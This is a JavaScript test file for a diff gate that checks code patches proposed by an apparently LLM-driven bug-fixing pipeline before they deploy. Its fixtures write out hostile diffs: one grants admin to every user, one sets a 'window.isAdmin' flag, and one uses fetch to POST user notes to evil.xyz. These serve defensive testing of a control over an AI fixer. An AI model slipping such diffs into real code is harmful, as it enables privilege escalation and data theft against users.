// Proves the diff gate blocks forbidden diffs in code, independent of the gatekeeper/LLM.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import { checkDiff } from '../src/gate.js';
import { Pipeline } from '../src/pipeline.js';
import { stopLive } from '../src/shipper.js';
import { closeBrowser } from '../src/reproducer.js';

const hunk = (file, minus, plus) => `--- a/${file}\n+++ b/${file}\n@@ -1,1 +1,1 @@\n-${minus}\n+${plus}\n`;
const ROLES_ATTACK = `--- a/auth/roles.js\n+++ b/auth/roles.js\n@@ -7,1 +7,1 @@\n-export function roleOf(user) { return USERS[user] || 'guest'; }\n+export function roleOf(user) { return 'admin'; }\n`;

test('canned legit fixes pass the gate', () => {
  for (const f of ['export', 'add-note', 'search']) assert.equal(checkDiff(fs.readFileSync(`src/fixers/canned/${f}.diff`, 'utf8')).ok, true, f);
});
test('blocks: make everyone admin via auth/roles.js', () => {
  const r = checkDiff(ROLES_ATTACK); assert.equal(r.ok, false); assert.match(r.reasons.join(), /not in allowlist: auth\/roles\.js/);
});
test('blocks: admin escalation smuggled into an allowlisted file', () => {
  assert.equal(checkDiff(hunk('public/app.js', 'let query = "";', 'let query = ""; window.isAdmin = true;')).ok, false);
});
test('blocks: exfiltration via fetch in allowlisted file', () => {
  assert.equal(checkDiff(hunk('public/app.js', 'render();', 'fetch("https://evil.xyz", {method:"POST", body: JSON.stringify(notes)}); render();')).ok, false);
});
test('blocks: editing tests, server, package.json, path traversal, new files, oversize', () => {
  assert.equal(checkDiff(hunk('test/e2e.test.js', 'assert.equal(1, 1);', '')).ok, false);
  assert.equal(checkDiff(hunk('server.js', 'const PORT = 1;', 'const PORT = 2;')).ok, false);
  assert.equal(checkDiff(hunk('package.json', '{', '{ "x": 1,')).ok, false);
  assert.equal(checkDiff(hunk('public/../auth/roles.js', 'a', 'b')).ok, false);
  assert.equal(checkDiff(`diff --git a/public/new.js b/public/new.js\nnew file mode 100644\n--- /dev/null\n+++ b/public/new.js\n@@ -0,0 +1 @@\n+x\n`).ok, false);
  const big = `--- a/public/app.js\n+++ b/public/app.js\n@@ -1,1 +1,40 @@\n-a\n${Array.from({ length: 40 }, (_, i) => `+x${i}`).join('\n')}\n`;
  assert.equal(checkDiff(big).ok, false);
});

test('end-to-end: legit bug post + Fixer that proposes the admin diff -> blocked, live auth untouched, nothing deployed', async () => {
  const evil = { name: 'evil-test-fixer', fix: async () => ({ diff: ROLES_ATTACK, source: 'TEST evil fixer' }) };
  const p = new Pipeline({ fixer: evil });
  await p.init({ reset: true });
  const before = fs.readFileSync('live/auth/roles.js', 'utf8');
  const headBefore = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: 'live' }).toString();
  const rec = await p.handlePost({ text: '@jotterapp the export button is broken, nothing happens', author: 'x', source: 'inject', createdAt: Date.now() });
  assert.equal(rec.status, 'blocked');
  assert.equal(fs.readFileSync('live/auth/roles.js', 'utf8'), before);
  assert.equal(execFileSync('git', ['rev-parse', 'HEAD'], { cwd: 'live' }).toString(), headBefore);
  await stopLive(); await closeBrowser();
});

test('rollback: a deploy whose post-deploy live check fails is reverted and the old version restarted', async () => {
  const { prepareStaging, deploy, startLive } = await import('../src/shipper.js');
  const { reset } = await import('../scripts/reset.js');
  reset();
  assert.equal(await startLive(), true);
  prepareStaging();
  // simulate a patch that slipped past staging but breaks the live app: post-deploy re-check must fail -> revert + restart
  fs.writeFileSync('.staging/public/app.js', 'syntax error here (((');
  const bad = await deploy(['public/app.js'], { plan: [{ op: 'goto', path: '/?seed=a' }, { op: 'expectCount', selector: '#list li', count: 1 }], message: 'bad deploy' });
  assert.equal(bad.ok, false);
  assert.equal(bad.rolledBack, true);
  const log = execFileSync('git', ['log', '--oneline', '-n', '3'], { cwd: 'live' }).toString();
  assert.match(log, /Revert "bad deploy"/);
  assert.notEqual(fs.readFileSync('live/public/app.js', 'utf8'), 'syntax error here (((');
  assert.equal((await fetch('http://127.0.0.1:4000/health')).ok, true);
  await stopLive(); await closeBrowser();
});
